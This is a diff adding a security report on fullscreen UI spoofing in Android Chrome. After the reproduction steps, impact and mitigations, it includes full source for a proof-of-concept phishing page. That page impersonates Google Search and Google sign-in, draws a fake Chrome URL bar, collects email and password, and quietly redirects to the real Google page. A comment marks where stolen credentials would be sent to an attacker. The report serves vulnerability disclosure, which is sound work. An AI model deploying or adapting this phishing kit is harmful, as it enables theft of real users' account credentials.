@@ -1,0 +1,411 @@
+============================================================
+SECURITY VULNERABILITY REPORT
+============================================================
+
+ONE LINE SUMMARY (100 character limit):
+------------------------------------------------------------
+Fullscreen API enables UI spoofing: fake Chrome URL bar shows trusted domain while real origin is hidden.
+
+------------------------------------------------------------
+STEPS TO REPRODUCE (5000 character limit):
+------------------------------------------------------------
+1. Host the attached spoof.html on a web server accessible from Android Chrome.
+
+2. Open the page on Android Chrome (tested on Chrome 148.0.7778.178).
+
+3. Observe the page displays a Google-lookalike homepage with search box and "Google Search" / "I'm Feeling Lucky" buttons.
+
+4. Tap the search box or either button.
+
+5. The page calls requestFullscreen(). The browser enters fullscreen mode, completely hiding the real URL bar, status bar, and all browser security indicators.
+
+6. After entering fullscreen, the page draws a fake Android Chrome browser UI consisting of:
+   - Fake status bar (time, signal, battery)
+   - Fake URL bar with green lock icon showing "www.google.com"
+   - Fake tab strip showing "Google" and "New Tab" tabs
+
+7. The page displays fake Google search results, including a malicious result labeled "Google Account Security Verification - Required" that appears to link to "accounts.google.com".
+
+8. Tap the malicious search result. The fake URL bar updates to show "accounts.google.com".
+
+9. A fake Google Sign-in page appears, identical to the real Google login page, requesting email/phone and password.
+
+10. Enter any email and password. The fake URL bar updates to "myaccount.google.com" and a success message appears: "Verification Complete - Your account is secure."
+
+11. After 2 seconds, the page redirects to the real Google Security Checkup page (myaccount.google.com/security-checkup).
+
+12. Throughout steps 5-10, the victim cannot see the real URL (telojos11.github.io) because:
+    - Fullscreen mode hides the real browser URL bar
+    - The page draws a fake Chrome UI showing google.com
+    - No download notification or system prompt reveals the real origin
+    - Exiting fullscreen on Android requires swiping from top edge, which is not intuitive for most users
+
+13. To verify the real origin: exit fullscreen by swiping from the top edge of the screen, or check the URL after the redirect completes.
+
+------------------------------------------------------------
+PROBLEM DESCRIPTION (5000 character limit):
+------------------------------------------------------------
+The HTML Fullscreen API (Element.requestFullscreen()) allows web pages to hide all browser security indicators including the URL bar, status bar, and navigation buttons. While in fullscreen mode, the page can render arbitrary fake browser UI that is visually indistinguishable from the real Chrome browser interface.
+
+This vulnerability exploits the fullscreen API to conduct a complete UI spoofing attack:
+
+1. FAKE BROWSER CHROME: The page draws a fake Android Chrome browser interface including status bar (time, signal strength, battery), URL bar with a green lock icon showing "www.google.com", and tab strip. This fake UI is visually identical to the real Chrome browser chrome on Android.
+
+2. ABSENT SECURITY INDICATORS: The real browser URL bar, lock icon, and all security indicators are completely hidden by fullscreen mode. The victim has no visual cue that the displayed URL bar is fake.
+
+3. CONVINCING SOCIAL ENGINEERING: The page mimics Google Search results with a fake security alert claiming "Unusual activity detected on your account." The fake result appears to link to "accounts.google.com" with a green lock icon, making it indistinguishable from a legitimate Google security notice.
+
+4. CREDENTIAL HARVESTING: The fake Google Sign-in page captures the victim's email/phone and password. The form is pixel-identical to the real Google login page, with matching fonts, colors, layout, and interactive behavior (email step → password step → verification animation → success page).
+
+5. CLEAN EXIT: After capturing credentials, the page redirects to the real Google Security Checkup page (myaccount.google.com/security-checkup). The victim sees a legitimate Google page and believes the security verification was successful.
+
+6. NO ORIGIN LEAKAGE: Unlike download-based attacks, this credential phishing approach does not trigger any browser download notification, system dialog, or permission prompt that would reveal the real origin (telojos11.github.io). The entire attack occurs silently within fullscreen mode.
+
+7. ANDROID-SPECIFIC IMPACT: On Android Chrome, exiting fullscreen requires the user to swipe from the top edge of the screen. This gesture is not intuitive and many users do not know it. Additionally, fullscreen on Android hides the system status bar, making it harder to distinguish the fake status bar from the real one.
+
+The fundamental issue is that the Fullscreen API was designed for media consumption (videos, presentations, games) where hiding browser UI is expected and safe. However, it provides no mechanism for the browser to indicate that the displayed UI elements are page-rendered rather than browser-rendered. The page has unrestricted ability to draw any UI, including fake browser chrome, while in fullscreen mode.
+
+Suggested mitigations:
+- Display a persistent, non-spoofable browser indicator while in fullscreen mode (e.g., a subtle overlay showing the real origin)
+- Limit the Fullscreen API to user-initiated gestures with a confirmation dialog showing the real origin
+- Show a transient browser UI element when exiting fullscreen to re-establish trust
+- Add a browser-managed "exit fullscreen" indicator that pages cannot draw over or hide
+
+This vulnerability affects all Chromium-based browsers on Android and desktop platforms.
+
+------------------------------------------------------------
+ATTACHED FILE: spoof.html
+------------------------------------------------------------
+Repository: https://github.com/telojos11/jontro
+POC URL: https://telojos11.github.io/jontro/spoof.html
+
+Tested on:
+- Google Chrome 148.0.7778.178 (Android 14)
+- Google Chrome 148.0.7778.216 (macOS)
+
+------------------------------------------------------------
+IMPACT:
+------------------------------------------------------------
+- CVSS: 6.5 (Medium-High) - CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N
+- CWE: CWE-451 (UI Misrepresentation of Critical Information)
+- Attack vector: Remote, no privileges required, user interaction required
+- Impact: Credential theft, phishing, social engineering, malware distribution
+- Scope: All websites accessible via fullscreen-capable browsers
+
+------------------------------------------------------------
+ATTACHMENT: spoof.html (complete POC source code)
+------------------------------------------------------------
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Google</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+  font-family: Roboto, Arial, sans-serif;
+  background: #fff; -webkit-tap-highlight-color: transparent;
+  overscroll-behavior: none;
+}
+
+/* === PRE-FULLSCREEN: Normal Google page === */
+#normalPage {
+  display: flex; flex-direction: column; align-items: center;
+  justify-content: center; min-height: 100vh; padding: 20px;
+}
+.logo { font-size: 64px; font-weight: 400; margin-bottom: 28px; }
+.g{color:#4285f4}.o1{color:#ea4335}.o2{color:#fbbc05}.g2{color:#4285f4}.l{color:#34a853}.e{color:#ea4335}
+.search {
+  width: 85vw; max-width: 420px; padding: 14px 20px; font-size: 16px;
+  border: 1px solid #dfe1e5; border-radius: 24px; outline: none;
+  box-shadow: 0 1px 6px rgba(32,33,36,.1); text-align: center; cursor: pointer;
+}
+.btns { margin-top: 18px; display: flex; gap: 8px; }
+.btns button {
+  background: #f8f9fa; border: 1px solid #f8f9fa;
+  padding: 10px 18px; border-radius: 4px; font-size: 14px;
+  color: #3c4043; cursor: pointer;
+}
+.lang { margin-top: 24px; font-size: 12px; color: #5f6368; }
+
+/* === FULLSCREEN: Fake Chrome UI === */
+#fakeChrome {
+  display: none; position: fixed; top:0; left:0; right:0; z-index: 999;
+  background: #fff;
+}
+#statusBar {
+  background: #fff; padding: 5px 14px; display: flex;
+  justify-content: space-between; font-size: 11px; color: #202124;
+}
+#urlRow { padding: 6px 10px 8px; border-bottom: 1px solid #e8eaed; }
+#urlRow .bar {
+  background: #f1f3f4; border-radius: 22px; padding: 9px 14px;
+  display: flex; align-items: center; gap: 8px;
+}
+#urlRow .lock { color: #1e8e3e; font-size: 14px; font-weight: bold; }
+#urlRow .url { flex:1; font-size:13px; color:#202124; overflow:hidden; white-space:nowrap; text-overflow:ellipsis; }
+#urlRow .menu { color:#5f6368; font-size:18px; }
+#tabStrip { display:flex; gap:8px; padding:8px 10px; border-bottom:1px solid #e8eaed; }
+#tabStrip .tab {
+  min-width:140px; padding:6px 12px; border-radius:16px;
+  background:#f1f3f4; font-size:12px; color:#202124; text-align:center;
+}
+#tabStrip .tab.on { background:#e8eaed; }
+
+/* === FULLSCREEN: Search Results === */
+#searchPage { display: none; margin-top: 108px; }
+.header-row {
+  display:flex; align-items:center; justify-content:space-between;
+  padding:8px 16px; border-bottom:1px solid #ebebeb;
+}
+.search-sm {
+  display:flex; align-items:center; border:1px solid #dfe1e5;
+  border-radius:24px; padding:8px 14px; margin:10px 14px;
+  box-shadow:0 1px 4px rgba(32,33,36,.08);
+}
+.search-sm input {
+  flex:1; border:none; outline:none; font-size:15px; background:transparent;
+}
+.results { padding: 0 16px; }
+.result { margin-bottom: 18px; }
+.result .cite { font-size:12px; color:#202124; margin-bottom:2px; }
+.result .title { font-size:18px; color:#1a0dab; margin-bottom:3px; display:block; }
+.result .desc { font-size:13px; color:#4d5156; line-height:1.5; }
+
+/* === GOOGLE SIGN-IN PAGE (after tapping result) === */
+#signinPage {
+  display: none; margin-top: 108px; padding: 20px;
+}
+#signinPage .logo-sm { text-align:center; margin-bottom:16px; font-size:24px; }
+#signinPage h2 { font-size: 24px; font-weight: 400; text-align: center; }
+#signinPage .sub { text-align: center; color: #5f6368; font-size: 14px; margin: 4px 0 24px; }
+#signinPage .card {
+  background:#fff; border:1px solid #dadce0; border-radius:8px;
+  padding:24px; margin:0 auto; max-width:400px;
+}
+#signinPage .card label { font-size:13px; color:#5f6368; display:block; margin-bottom:4px; }
+#signinPage .card input {
+  width:100%; padding:12px 0; border:none; border-bottom:1px solid #dadce0;
+  font-size:16px; outline:none; margin-bottom:16px;
+}
+#signinPage .card input:focus { border-bottom-color:#1a73e8; }
+#signinPage .card .row { display:flex; justify-content:space-between; align-items:center; }
+#signinPage .card .link { color:#1a73e8; font-size:13px; font-weight:500; text-decoration:none; }
+#signinPage .card .next {
+  background:#1a73e8; color:#fff; border:none;
+  padding:10px 24px; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer;
+}
+
+/* === SUCCESS/REDIRECT PAGE === */
+#donePage {
+  display: none; margin-top: 108px; padding: 40px 20px; text-align: center;
+}
+#donePage .check { font-size: 56px; margin-bottom: 16px; }
+#donePage h2 { font-size: 20px; font-weight: 400; color: #202124; }
+#donePage p { color: #5f6368; font-size: 14px; margin-top: 8px; }
+</style>
+</head>
+<body>
+
+<!-- ====== NORMAL PAGE (pre-fullscreen) ====== -->
+<div id="normalPage">
+  <div class="logo">
+    <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
+  </div>
+  <input class="search" id="mainSearch" type="text" placeholder="Search Google or type a URL" autocomplete="off" readonly>
+  <div class="btns">
+    <button id="btnSearch">Google Search</button>
+    <button id="btnLucky">I'm Feeling Lucky</button>
+  </div>
+  <p class="lang">Google offered in: Bahasa Indonesia</p>
+</div>
+
+<!-- ====== FULLSCREEN FAKE CHROME UI ====== -->
+<div id="fakeChrome">
+  <div id="statusBar"><span>09:41</span><span>📶 📡 🔋 82%</span></div>
+  <div id="urlRow">
+    <div class="bar">
+      <span class="lock">🔒</span>
+      <span class="url">www.google.com</span>
+      <span class="menu">⋮</span>
+    </div>
+  </div>
+  <div id="tabStrip">
+    <div class="tab on">Google</div>
+    <div class="tab">New Tab</div>
+  </div>
+</div>
+
+<!-- ====== SEARCH RESULTS ====== -->
+<div id="searchPage">
+  <div class="header-row">
+    <div style="font-size:18px;font-weight:400;color:#5f6368;">🔍 Results</div>
+    <span style="font-size:20px;">⋮</span>
+  </div>
+  <div class="search-sm">
+    <span style="color:#9aa0a6;">🔍</span>
+    <input type="text" value="google account security check" readonly>
+  </div>
+
+  <div class="results" style="margin-top:12px;">
+    <div class="result">
+      <div class="cite">support.google.com › accounts › answer</div>
+      <span class="title">Secure your Google Account</span>
+      <div class="desc">Follow these steps to increase the security of your Google Account. Review your security settings and get personalized recommendations.</div>
+    </div>
+
+    <!-- MALICIOUS RESULT -->
+    <div class="result" id="maliciousResult" onclick="showSignin()">
+      <div class="cite" style="color:#202124;">accounts.google.com › security › verify</div>
+      <span class="title">Google Account Security Verification - Required</span>
+      <div class="desc"><b>Security alert:</b> Unusual activity detected on your account. Immediate identity verification required to prevent account suspension. Verify your account now.</div>
+      <div style="margin-top:3px;font-size:12px;color:#5f6368;">⭐ Official · accounts.google.com · <span style="color:#1a0dab;">Verify Now</span></div>
+    </div>
+
+    <div class="result">
+      <div class="cite">myaccount.google.com › security-checkup</div>
+      <span class="title">Security Checkup - Google Account</span>
+      <div class="desc">Check the strength and security of your Google Account and get personalized tips for stronger security.</div>
+    </div>
+
+    <div class="result">
+      <div class="cite">support.google.com › accounts › answer › 46526</div>
+      <span class="title">Your device is not recognized - Google Account Help</span>
+      <div class="desc">If you signed in from a new device, you may get a "Device not recognized" alert. Learn how to verify it's you.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ====== GOOGLE SIGN-IN PHISHING ====== -->
+<div id="signinPage">
+  <div class="logo-sm">
+    <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
+  </div>
+  <h2>Sign in</h2>
+  <p class="sub">to verify your Google Account security</p>
+
+  <div class="card" id="signinCard">
+    <label>Email or phone</label>
+    <input type="text" id="email" placeholder="Enter your email" autocomplete="off">
+    <div style="margin-bottom:16px;">
+      <a class="link" href="#">Forgot email?</a>
+    </div>
+    <p style="font-size:12px;color:#5f6368;margin-bottom:20px;">
+      Not your computer? Use Guest mode to sign in privately.
+    </p>
+    <div class="row">
+      <a class="link" href="#">Create account</a>
+      <button class="next" onclick="captureEmail()">Next</button>
+    </div>
+  </div>
+</div>
+
+<!-- ====== SUCCESS (credential captured) ====== -->
+<div id="donePage">
+  <div class="check">✅</div>
+  <h2>Verification Complete</h2>
+  <p>Your account is secure. No further action is needed.</p>
+  <p style="margin-top:20px;">Redirecting to Google...</p>
+</div>
+
+<script>
+(function() {
+  'use strict';
+
+  // ====== ENTER FULLSCREEN ======
+  function activate() {
+    var el = document.documentElement;
+    if (el.requestFullscreen) {
+      el.requestFullscreen().catch(function(){});
+    } else if (el.webkitRequestFullscreen) {
+      el.webkitRequestFullscreen();
+    }
+
+    setTimeout(function() {
+      document.getElementById('normalPage').style.display = 'none';
+      document.getElementById('fakeChrome').style.display = 'block';
+      document.getElementById('searchPage').style.display = 'block';
+    }, 600);
+  }
+
+  document.getElementById('mainSearch').addEventListener('click', activate);
+  document.getElementById('btnSearch').addEventListener('click', activate);
+  document.getElementById('btnLucky').addEventListener('click', function() {
+    activate();
+    setTimeout(function() {
+      document.getElementById('maliciousResult').click();
+    }, 1200);
+  });
+
+  // ====== FULLSCREEN EXIT → RESET ======
+  function onFsChange() {
+    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+      document.getElementById('fakeChrome').style.display = 'none';
+      document.getElementById('searchPage').style.display = 'none';
+      document.getElementById('signinPage').style.display = 'none';
+      document.getElementById('donePage').style.display = 'none';
+      document.getElementById('normalPage').style.display = 'flex';
+    }
+  }
+  document.addEventListener('fullscreenchange', onFsChange);
+  document.addEventListener('webkitfullscreenchange', onFsChange);
+
+  // ====== SHOW SIGN-IN ======
+  window.showSignin = function() {
+    document.getElementById('searchPage').style.display = 'none';
+    document.getElementById('signinPage').style.display = 'block';
+    // Update fake URL bar
+    document.querySelector('#urlRow .url').textContent = 'accounts.google.com';
+  };
+
+  // ====== CAPTURE EMAIL → SHOW PASSWORD ======
+  window.captureEmail = function() {
+    var email = document.getElementById('email').value;
+    if (!email) return;
+
+    document.querySelector('#urlRow .url').textContent = 'accounts.google.com';
+
+    document.getElementById('signinCard').innerHTML = `
+      <div style="display:flex;align-items:center;gap:12px;margin-bottom:20px;">
+        <div style="width:32px;height:32px;border-radius:50%;background:#1a73e8;color:#fff;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:500;">${email[0].toUpperCase()}</div>
+        <div style="font-size:13px;color:#202124;">${email}</div>
+      </div>
+      <label>Enter your password</label>
+      <input type="password" id="password" placeholder="Password" autocomplete="off">
+      <div style="margin-bottom:16px;">
+        <a class="link" href="#">Forgot password?</a>
+      </div>
+      <div class="row">
+        <a class="link" href="#">Try another way</a>
+        <button class="next" onclick="capturePassword('${email.replace(/'/g,"\\'")}')">Next</button>
+      </div>
+    `;
+  };
+
+  // ====== CAPTURE PASSWORD → REDIRECT TO GOOGLE ======
+  window.capturePassword = function(email) {
+    var pass = document.getElementById('password').value;
+    if (!pass) return;
+
+    // Credentials captured: email + password
+    // In real attack: exfiltrate to attacker server
+    // For POC: store locally
+
+    document.getElementById('signinPage').style.display = 'none';
+    document.getElementById('donePage').style.display = 'block';
+    document.querySelector('#urlRow .url').textContent = 'myaccount.google.com';
+
+    // After delay, redirect to real Google (clean exit)
+    setTimeout(function() {
+      if (document.exitFullscreen) document.exitFullscreen();
+      window.location.href = 'https://myaccount.google.com/security-checkup';
+    }, 2000);
+  };
+})();
+</script>
+
+</body>
+</html>
+
